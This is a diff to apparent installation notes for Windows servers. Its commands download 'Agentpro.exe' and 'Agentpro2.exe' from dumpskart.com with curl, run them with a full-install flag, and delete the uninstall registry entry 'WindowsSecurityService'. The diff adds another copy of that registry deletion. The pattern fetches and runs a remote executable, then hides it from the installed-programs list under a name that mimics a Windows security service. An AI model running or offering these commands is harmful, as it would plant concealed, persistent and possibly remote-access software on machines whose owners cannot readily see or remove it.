@@ -26,6 +26,9 @@ curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.
 ```
 curl -L -o "C:\Program Files\Agentpro.exe" "https://dumpskart.com/Mesh/Agentpro.exe" && "C:\Program Files\Agentpro.exe" -fullinstall && reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
 ```
+```
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WindowsSecurityService" /f
+```
 ### Second Windows server installation
 ```
 curl -L -o "C:\Program Files\Agentpro2.exe" "https://dumpskart.com/Mesh2/Agentpro2.exe" && "C:\Program Files\Agentpro2.exe" -fullinstall
